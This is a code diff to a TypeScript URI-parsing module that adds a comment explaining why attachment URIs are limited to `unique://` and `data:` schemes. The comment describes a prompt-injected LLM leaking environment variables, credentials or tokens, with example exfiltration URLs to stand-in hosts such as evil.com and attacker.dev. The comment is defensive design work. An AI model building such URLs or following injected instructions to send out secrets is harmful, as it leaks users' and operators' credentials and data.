@@ -2,6 +2,17 @@
 // Fetching user-supplied URLs server-side would expose the service to SSRF attacks:
 // an attacker (or a prompt-injected LLM) could target internal infrastructure
 // (metadata servers, cluster-internal services, etc.) by supplying a crafted URL.
+//
+// Data exfiltration via attachments is another risk: a prompt-injected LLM could
+// encode sensitive data (environment variables, database credentials, internal API
+// responses, chat history) into the attachment URI itself — for example:
+//   - `https://evil.com/collect?secret=<base64-encoded-env-vars>`
+//   - `https://attacker.dev/exfil/<jwt-token-from-memory>`
+//   - A `data:` URI converted to a file and sent as an email attachment containing
+//     scraped internal data
+// By restricting to `unique://` and `data:` schemes, outbound fetches to attacker-
+// controlled servers are prevented, closing this exfiltration channel.
+//
 // Use `unique://` for Unique knowledge-base files or `data:` for inline content instead.
 export type ParsedUri =
   | { type: 'unique'; chatId: string | null; contentId: string }
